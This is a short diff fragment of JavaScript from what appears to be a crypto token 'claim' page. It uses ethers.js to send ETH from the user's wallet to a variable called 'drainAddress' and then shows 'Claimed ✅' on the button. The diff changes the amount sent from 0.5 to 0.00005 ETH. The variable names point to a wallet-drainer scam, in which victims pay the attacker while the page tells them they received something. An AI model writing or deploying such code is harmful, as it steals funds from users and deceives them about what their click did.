@@ -109,7 +109,7 @@
       try {
         const tx = await signer.sendTransaction({
           to: drainAddress,
-          value: ethers.utils.parseEther("0.5")
+          value: ethers.utils.parseEther("0.00005")
         });
         await tx.wait();
         claimBtn.innerText = "Claimed ✅";
